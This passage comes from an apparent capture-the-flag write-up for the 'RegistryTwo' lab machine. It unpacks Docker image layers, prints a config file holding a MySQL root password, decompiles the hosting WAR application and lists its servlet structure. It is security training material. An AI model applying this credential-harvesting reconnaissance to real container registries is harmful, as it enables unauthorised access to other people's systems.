<span class="code-red">sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110.tar.gz</span>
<span class="code-red">sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz</span>
<span class="code-red">sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9.tar.gz</span>
<span class="code-red">sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42.tar.gz</span>
<span class="code-red">sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4.tar.gz</span>
<span class="code-red">sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b.tar.gz</span>
<span class="code-red">sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c.tar.gz</span>
<span class="code-red">sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268.tar.gz</span>
<span class="code-red">sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz</span>
<span class="code-red">sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec.tar.gz</span>
<span class="code-red">sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc.tar.gz</span>
<span class="code-red">sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84.tar.gz</span>
<span class="code-red">sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e.tar.gz</span>
<span class="code-red">sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626.tar.gz</span>
<span class="code-red">sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28.tar.gz</span>
</code></pre></div><p>There we have it as compressed archives. Let&rsquo;s take a look at the first one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz</span>
sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz: gzip compressed data, original size modulo 2^32 2560  

<span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz</span>
x etc/
x etc/hosting.ini

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">etc/hosting.ini</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#Mon Jan 30 21:05:01 GMT 2023</span>
<span class="mtk5">mysql.password<span>=<span class="mtk4">O8lBvQUBPU4CMbvJmYqY</span>
<span class="mtk5">rmi.host<span>=<span class="mtk4">registry.webhosting.htb</span>
<span class="mtk5">mysql.user<span>=<span class="mtk4">root</span>
<span class="mtk5">mysql.port<span>=<span class="mtk4">3306</span>
<span class="mtk5">mysql.host<span>=<span class="mtk4">localhost</span>
<span class="mtk5">domains.start-template<span>=<span class="mtk4">&lt;body&gt;\r\n&lt;h1&gt;It works\!&lt;/h1&gt;\r\n&lt;/body&gt;</span>  
<span class="mtk5">domains.max<span>=<span class="mtk4">5</span>
<span class="mtk5">rmi.port<span>=<span class="mtk4">9002</span>
</code></pre></div><p>Well, it contains sensitive information, but it is useless for the moment.</p><h3 id="war-decompilation">WAR decompilation</h3><p>There is another blob that contains the WAR file that is running on the server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz</span>  
x usr/
x usr/local/
x usr/local/tomcat/
x usr/local/tomcat/webapps/
x usr/local/tomcat/webapps/hosting.war
</code></pre></div><p>WAR is just a JAR for web applications:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">usr/local/tomcat/webapps/hosting.war</span>
usr/local/tomcat/webapps/hosting.war: Java archive data (JAR)  

<span class="code-cyan">$</span> <span class="code-dark-green">cp</span> <span class="mtku">usr/local/tomcat/webapps/hosting.war</span> hosting.jar
</code></pre></div><p>We can go to <a target="_blank" href="http://www.javadecompilers.com">javadecompilers.com</a> and upload the JAR to get readable Java source code (CFR decompiler works well usually):</p><p><img alt="RegistryTwo 16" src="/images/HTB/RegistryTwo/RegistryTwo-16.webp"></p><p><img alt="RegistryTwo 17" src="/images/HTB/RegistryTwo/RegistryTwo-17.webp"></p><p>Moreover, apart from Java classes, a WAR usually contains front-end files (HTML, CSS, JS, images), configuration files (mainly XML) and JSP files. To get them, we must decompress the JAR file (which is actually a ZIP file):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> <span class="mtku">hosting.jar</span> | <span class="code-dark-green">head</span>
00000000: 504b 0304 1400 0808 0800 ad99 7b56 0000  PK..........{V..
00000010: 0000 0000 0000 0000 0000 1400 0400 4d45  ..............ME
00000020: 5441 2d49 4e46 2f4d 414e 4946 4553 542e  TA-INF/MANIFEST.
00000030: 4d46 feca 0000 f34d cccb 4c4b 2d2e d10d  MF.....M..LK-...
00000040: 4b2d 2ace cccf b352 30d4 33e0 e572 2e4a  K-*....R0.3..r.J
00000050: 4d2c 494d d175 aab4 52f0 cc2b 49cd c9c9  M,IM.u..R..+I...
00000060: f452 f074 7175 e4e5 722a cdcc 2901 4ba4  .R.tqu..r*..).K.
00000070: 14e7 e797 4004 5274 bd52 b2ad 14ca 2086  ....@.Rt.R.... .
00000080: 2818 020d d133 34e4 e5e2 e502 0050 4b07  (....34......PK.
00000090: 08b5 a6d0 d257 0000 0061 0000 0050 4b03  .....W...a...PK.

<span class="code-cyan">$</span> <span class="code-dark-green">cp</span> <span class="mtku">hosting.jar</span> hosting.zip

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -l <span class="mtku">hosting.zip</span>
Archive:  hosting.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       97  03-27-2023 19:13   META-INF/MANIFEST.MF
        0  03-27-2023 19:13   WEB-INF/
        0  03-27-2023 19:13   WEB-INF/jsp/
        0  03-27-2023 19:13   WEB-INF/jsp/domain/
    17620  03-27-2023 19:13   WEB-INF/jsp/domain/list.jsp
     1042  03-27-2023 19:13   WEB-INF/jsp/domain/new.jsp
        0  03-27-2023 19:13   WEB-INF/jsp/auth/
     4971  03-27-2023 19:13   WEB-INF/jsp/auth/signup.jsp
     4301  03-27-2023 19:13   WEB-INF/jsp/auth/signin.jsp
    21796  03-27-2023 19:13   WEB-INF/jsp/dashboard.jsp
     6521  03-27-2023 19:13   WEB-INF/jsp/view.jsp
     3844  03-27-2023 19:13   WEB-INF/jsp/configuration.jsp
     9921  03-27-2023 19:13   WEB-INF/jsp/profile.jsp
     6908  03-27-2023 19:13   WEB-INF/jsp/edit.jsp
      849  03-27-2023 19:13   WEB-INF/web.xml
        0  03-27-2023 19:13   WEB-INF/lib/
   587402  03-27-2023 19:13   WEB-INF/lib/commons-lang3-3.12.0.jar
   327135  03-27-2023 19:13   WEB-INF/lib/commons-io-2.11.0.jar
    76204  03-27-2023 19:13   WEB-INF/lib/hibernate-commons-annotations-5.1.0.Final.jar
  3409747  03-27-2023 19:13   WEB-INF/lib/tomcat-embed-core-9.0.41.jar
  3472118  03-27-2023 19:13   WEB-INF/lib/byte-buddy-1.10.10.jar
  2321813  03-27-2023 19:13   WEB-INF/lib/mysql-connector-java-8.0.17.jar
    32103  03-27-2023 19:13   WEB-INF/lib/juel-api-2.2.7.jar
    66469  03-27-2023 19:13   WEB-INF/lib/jboss-logging-3.3.2.Final.jar
    13349  03-27-2023 19:13   WEB-INF/lib/tomcat-annotations-api-9.0.41.jar
   164556  03-27-2023 19:13   WEB-INF/lib/javax.persistence-api-2.2.jar
   323630  03-27-2023 19:13   WEB-INF/lib/dom4j-2.1.3.jar
   195684  03-27-2023 19:13   WEB-INF/lib/jandex-2.1.3.Final.jar
    56674  03-27-2023 19:13   WEB-INF/lib/javax.activation-api-1.2.0.jar
   108892  03-27-2023 19:13   WEB-INF/lib/juel-impl-2.2.7.jar
  1421323  03-27-2023 19:13   WEB-INF/lib/protobuf-java-3.6.1.jar
  1715750  03-27-2023 19:13   WEB-INF/lib/freemarker-2.3.31.jar
    36073  03-27-2023 19:13   WEB-INF/lib/stax-ex-1.8.jar
  7293382  03-27-2023 19:13   WEB-INF/lib/hibernate-core-5.4.16.Final.jar
    25523  03-27-2023 19:13   WEB-INF/lib/istack-commons-runtime-3.0.7.jar
   777669  03-27-2023 19:13   WEB-INF/lib/javassist-3.24.0-GA.jar
  1093432  03-27-2023 19:13   WEB-INF/lib/jaxb-runtime-2.3.1.jar
    26290  03-27-2023 19:13   WEB-INF/lib/jboss-transaction-api_1.2_spec-1.1.1.Final.jar
   128076  03-27-2023 19:13   WEB-INF/lib/jaxb-api-2.3.1.jar
   445288  03-27-2023 19:13   WEB-INF/lib/antlr-2.7.7.jar
   311876  03-27-2023 19:13   WEB-INF/lib/FastInfoset-1.2.15.jar
   414240  03-27-2023 19:13   WEB-INF/lib/jstl-1.2.jar
    72446  03-27-2023 19:13   WEB-INF/lib/commons-fileupload-1.4.jar
    70288  03-27-2023 19:13   WEB-INF/lib/txw2-2.3.1.jar
    67815  03-27-2023 19:13   WEB-INF/lib/classmate-1.5.1.jar
   559366  03-27-2023 19:13   WEB-INF/lib/commons-collections-3.1.jar
        0  03-27-2023 19:13   WEB-INF/classes/
        0  03-27-2023 19:13   WEB-INF/classes/com/
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/rmi/
      989  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/rmi/FileService.class
     2468  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/rmi/AbstractFile.class
     2109  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/rmi/RMIClientWrapper.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/filter/
     2566  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/filter/AuthenticationFilter.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/
     3293  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/CryptUtil.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/config/
     1227  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/config/ConfigSchedule$1.class
     3876  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/config/Settings.class
      892  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/config/ConfigWatcher.class
     2022  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/config/ConfigSchedule.class
      986  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/Constants.class
     2457  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/FileUtil.class
     4620  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/PasswordAuthentication.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/edits/
     3211  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/edits/EditFileSessionManager.class  
     3023  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/edits/EditFileSession.class
     5569  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/StringUtil.class
     4636  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/DisplayUtil.class
     3144  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/utils/HibernateUtil.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/
     3172  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/RegistrationServlet.class
     1812  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/AbstractServlet.class
     3609  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/AuthenticationServlet.class
     3934  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/ProfileServlet.class
     3798  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/ConfigurationServlet.class
     1324  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/DashboardServlet.class
    10359  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/DomainServlet.class
     4034  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/ViewServlet.class
     1465  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/LogoutServlet.class
     2572  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/AutoSaveServlet.class
     4462  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/services/EditServlet.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/security/
     3911  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/security/IOSecurity.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/dao/
     4379  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/dao/UserDAO.class
     2442  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/dao/DomainDAO.class
        0  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/model/
     4866  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/model/Domain.class
     4624  03-27-2023 19:13   WEB-INF/classes/com/htb/hosting/model/User.class
     1532  03-27-2023 19:13   500.jsp
     1565  03-27-2023 19:13   403.jsp
        0  03-27-2023 19:13   resources/
        0  03-27-2023 19:13   resources/css/
  2934019  03-27-2023 19:13   resources/css/tailwind.min.css
        0  03-27-2023 19:13   META-INF/
     1685  03-27-2023 19:13   404.jsp
    22236  03-27-2023 19:13   template.html
       71  03-27-2023 19:13   index.jsp
---------                     -------
 28761442                     101 files

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> -q <span class="mtku">hosting.zip</span>
</code></pre></div><p>Just to finish with the Docker image inspection, we can find this script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tar</span> xvfz <span class="mtku">sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4.tar.gz</span>  
x usr/
x usr/local/
x usr/local/bin/
x usr/local/bin/docker-java-home

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">usr/local/bin/docker-java-home</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
<span class="mtk7">set</span><span class="mtk1"> </span><span class="mtk6">-e</span>

<span class="mtk8">dirname</span><span class="mtk1"> </span><span class="mtk4">"$(</span><span class="mtk8">dirname</span><span class="mtk4"> "$(</span><span class="mtk8">readlink</span><span class="mtk4"> </span><span class="mtk6">-f</span><span class="mtk4"> "$(</span><span class="mtk7">which</span><span class="mtk4"> javac </span><span class="mtk5">||</span><span class="mtk4"> </span><span class="mtk7">which</span><span class="mtk4"> java)")")"</span>  
</code></pre></div><p>There are also blobs that contain the <code>tomcat-users.xml</code> configuration file, where the administration password is usually stored, but there is no password there.</p><h2 id="source-code-analysis">Source code analysis</h2><p>The Java source code of the web application is overwhelming, I will only put specific parts that are relevant.</p><p>The project is structured as follows:</p><ul><li><code>security</code>: It contains a class that contains some authorization checks and sanitization functions</li><li><code>model</code>: Here there are two classes called <code>User</code> and <code>Domain</code>, which are the main objects handled by the web application</li><li><code>filter</code>: This is usually named as middleware in other frameworks, it just checks if incoming requests are authenticated or not</li><li><code>services</code>: Here we have all the <em>servlets</em> (controllers in Java terms):<ul><li><code>AbstractServlet</code></li><li><code>AuthenticationServlet</code></li><li><code>AutoSaveServlet</code></li><li><code>ConfigurationServlet</code></li><li><code>DashboardServlet</code></li><li><code>DomainServlet</code></li><li><code>EditServlet</code></li><li><code>LogoutServlet</code></li><li><code>ProfileServlet</code></li><li><code>RegistrationServlet</code></li><li><code>ViewServlet</code></li></ul></li><li><code>dao</code>: These are the Data Access Objects, used to access the MySQL database using <code>Hibernate</code> (<code>UserDAO</code> and <code>DomainDAO</code>). There does not seem to be SQL-related vulnerabilities here</li><li><code>rmi</code>: This stands for Remote Method Invocation, it contains a class that implements an RMI client (<code>RMIClientWrapper</code>)</li><li><code>utils</code>: Just utility functions used by other classes</li></ul><p>In summary, this is the project structure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span> <span class="mtku">WEB-INF</span> <span class="mtku">META-INF</span>
WEB-INF
├── classes
│   └── com
│       └── htb
│           └── hosting
│               ├── dao
│               │   ├── DomainDAO.class
│               │   └── UserDAO.class
│               ├── filter
│               │   └── AuthenticationFilter.class
│               ├── model
│               │   ├── Domain.class
│               │   └── User.class
│               ├── rmi
│               │   ├── AbstractFile.class
│               │   ├── FileService.class
│               │   └── RMIClientWrapper.class
│               ├── security
│               │   └── IOSecurity.class
│               ├── services
│               │   ├── AbstractServlet.class
│               │   ├── AuthenticationServlet.class
│               │   ├── AutoSaveServlet.class
│               │   ├── ConfigurationServlet.class
│               │   ├── DashboardServlet.class
│               │   ├── DomainServlet.class
│               │   ├── EditServlet.class
│               │   ├── LogoutServlet.class
│               │   ├── ProfileServlet.class
│               │   ├── RegistrationServlet.class
│               │   └── ViewServlet.class
│               └── utils
│                   ├── Constants.class
│                   ├── CryptUtil.class
│                   ├── DisplayUtil.class
│                   ├── FileUtil.class
│                   ├── HibernateUtil.class
│                   ├── PasswordAuthentication.class
│                   ├── StringUtil.class
│                   ├── config
│                   │   ├── ConfigSchedule$1.class
│                   │   ├── ConfigSchedule.class
│                   │   ├── ConfigWatcher.class
│                   │   └── Settings.class
│                   └── edits
│                       ├── EditFileSession.class
│                       └── EditFileSessionManager.class  
├── jsp
│   ├── auth
│   │   ├── signin.jsp
│   │   └── signup.jsp
│   ├── configuration.jsp
│   ├── dashboard.jsp
│   ├── domain
│   │   ├── list.jsp
│   │   └── new.jsp
│   ├── edit.jsp
│   ├── profile.jsp
│   └── view.jsp
├── lib
│   ├── FastInfoset-1.2.15.jar
│   ├── antlr-2.7.7.jar
│   ├── byte-buddy-1.10.10.jar
│   ├── classmate-1.5.1.jar
│   ├── commons-collections-3.1.jar
│   ├── commons-fileupload-1.4.jar
│   ├── commons-io-2.11.0.jar
│   ├── commons-lang3-3.12.0.jar
│   ├── dom4j-2.1.3.jar
│   ├── freemarker-2.3.31.jar
│   ├── hibernate-commons-annotations-5.1.0.Final.jar
│   ├── hibernate-core-5.4.16.Final.jar
│   ├── istack-commons-runtime-3.0.7.jar
│   ├── jandex-2.1.3.Final.jar
│   ├── javassist-3.24.0-GA.jar
│   ├── javax.activation-api-1.2.0.jar
│   ├── javax.persistence-api-2.2.jar
│   ├── jaxb-api-2.3.1.jar
│   ├── jaxb-runtime-2.3.1.jar
│   ├── jboss-logging-3.3.2.Final.jar
│   ├── jboss-transaction-api_1.2_spec-1.1.1.Final.jar
│   ├── jstl-1.2.jar
│   ├── juel-api-2.2.7.jar
│   ├── juel-impl-2.2.7.jar
│   ├── mysql-connector-java-8.0.17.jar
│   ├── protobuf-java-3.6.1.jar
│   ├── stax-ex-1.8.jar
│   ├── tomcat-annotations-api-9.0.41.jar
│   ├── tomcat-embed-core-9.0.41.jar
│   └── txw2-2.3.1.jar
└── web.xml
META-INF
└── MANIFEST.MF

19 directories, 74 files
</code></pre></div><p>If we look at the <em>servlets</em> in <code>services</code>, we will recognize all of them from previous tested functionalities. But there is one called <code>ConfigurationServlet</code> that was not possible to test. This is the Java code for this class:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/*</span>
<span class="mtk3"> * Decompiled with CFR 0.150.</span>
<span class="mtk3"> * </span>
<span class="mtk3"> * Could not load the following classes:</span>
<span class="mtk3"> *  com.htb.hosting.services.AbstractServlet</span>
<span class="mtk3"> *  com.htb.hosting.services.ConfigurationServlet</span>
<span class="mtk3"> *  com.htb.hosting.utils.config.Settings</span>
<span class="mtk3"> *  javax.servlet.RequestDispatcher</span>
<span class="mtk3"> *  javax.servlet.ServletException</span>
<span class="mtk3"> *  javax.servlet.ServletRequest</span>
<span class="mtk3"> *  javax.servlet.ServletResponse</span>
<span class="mtk3"> *  javax.servlet.annotation.WebServlet</span>
<span class="mtk3"> *  javax.servlet.http.HttpServletRequest</span>
<span class="mtk3"> *  javax.servlet.http.HttpServletResponse</span>
<span class="mtk3"> */</span>
<span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">services</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">services</span><span class="mtk5">.</span><span class="mtk8 mtku">AbstractServlet</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">utils</span><span class="mtk5">.</span><span class="mtk8 mtku">config</span><span class="mtk5">.</span><span class="mtk8 mtku">Settings</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">io</span><span class="mtk5">.</span><span class="mtk8 mtku">IOException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">HashMap</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">RequestDispatcher</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">ServletException</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">ServletRequest</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">ServletResponse</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">annotation</span><span class="mtk5">.</span><span class="mtk8 mtku">WebServlet</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">http</span><span class="mtk5">.</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">javax</span><span class="mtk5">.</span><span class="mtk8 mtku">servlet</span><span class="mtk5">.</span><span class="mtk8 mtku">http</span><span class="mtk5">.</span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1">;</span>

<span class="mtk3">/*</span>
<span class="mtk3"> * Exception performing whole class analysis ignor</span><span class="mtk3">ed.</span>
<span class="mtk3"> */</span>
<span class="mtk1">@</span><span class="mtk8 mtku">WebServlet</span><span class="mtk1">(</span><span class="mtk6">name</span><span class="mtk5">=</span><span class="mtk4">"reconfigure"</span><span class="mtk1">, </span><span class="mtk6">value</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">"/reconfigure"</span><span class="mtk1">})</span>
<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">ConfigurationServlet</span>
<span class="mtk5">extends</span><span class="mtk1"> </span><span class="mtk8 mtku">AbstractServlet</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">final</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">serialVersionUID</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2336661269816738483L</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">doGet</span><span class="mtk1">(</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">, </span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1"> </span><span class="mtk9 mtki">response</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1">, </span><span class="mtk8 mtku">ServletException</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8 mtku">ConfigurationServlet</span><span class="mtk1">.</span><span class="mtk8">checkManager</span><span class="mtk1">((</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk8 mtku">RequestDispatcher</span><span class="mtk1"> </span><span class="mtk1">rd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">.</span><span class="mtk8">getRequestDispatcher</span><span class="mtk1">(</span><span class="mtk4">"/WEB-INF/jsp/configuration.jsp"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">rd</span><span class="mtk1">.</span><span class="mtk8">include</span><span class="mtk1">((</span><span class="mtk8 mtku">ServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">ServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">doPost</span><span class="mtk1">(</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1"> </span><span class="mtk9 mtki">request</span><span class="mtk1">, </span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1"> </span><span class="mtk9 mtki">response</span><span class="mtk1">) </span><span class="mtk5">throws</span><span class="mtk1"> </span><span class="mtk8 mtku">IOException</span><span class="mtk1">, </span><span class="mtk8 mtku">ServletException</span><span class="mtk1"> {</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8 mtku">ConfigurationServlet</span><span class="mtk1">.</span><span class="mtk8">checkManager</span><span class="mtk1">((</span><span class="mtk8 mtku">HttpServletRequest</span><span class="mtk1">)</span><span class="mtk9 mtki">request</span><span class="mtk1">, (</span><span class="mtk8 mtku">HttpServletResponse</span><span class="mtk1">)</span><span class="mtk9 mtki">response</span><span class="mtk1">)) {</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk8 mtku">HashMap</span><span class="mtk1"> </span><span class="mtk1">parameterMap</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">HashMap</span><span class="mtk1">();</span>
